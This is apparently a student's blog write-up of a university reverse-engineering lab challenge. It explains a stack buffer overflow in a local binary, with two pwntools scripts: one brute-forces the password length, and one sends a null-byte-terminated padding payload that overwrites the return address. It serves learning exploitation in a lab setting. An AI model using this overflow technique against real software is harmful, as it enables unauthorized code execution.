---
layout: post
title:  UNIBUC_RE_lab_5_task_2
image: /assets/img/UNIBUC_RE.jpg
date:   2022-09-01 16:39:01
tags:
- pwn
description: revamped first challenge where password length is stored in the bss region
categories:
- UNIBUC RE
---

revamped first challenge where password length is stored in the bss region

![](/assets/img/2022-09-01-22-22-17.png)

We cannot overwrite the password length so looking at the other protections we need to bypass we only need to overwrite the return address and escape the exit calls until return.

We can insert a \0 after we find out how many characters the password has by testing for password mismatch string in the output. Next we will put our own choice of characters until we reach the stack pointer and return address and insert the right one.
Looking at the checksec we see that it has no PIE so we can call the function as we please.
![](/assets/img/2022-09-01-22-27-48.png)
Let's compute how much space we need
![](/assets/img/2022-09-01-22-33-09.png)
we need 40 bytes of data and then 8 bytes of the address we want.

Step 1 find out the size of the password:

```
from pwn import *

for i in range(1,80):
    io = process("./task2")
    io.recvuntil("Enter password:")
    io.sendline(i*"x")
    text=io.recv(timeout=1)
    if b'length' not in text:
        print(text)
        print(i)
        io.close()
        break
    io.close()

```

Step 2 input the malicious payload:

```
from pwn import *

io = process("./task2")
io.recvuntil("Enter password:")
io.sendline("aaaaaaaa\0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc6\x11\x40\x00\x00\x00\x00\x00")
io.interactive()

```
Great success
![](/assets/img/2022-09-01-22-39-20.png)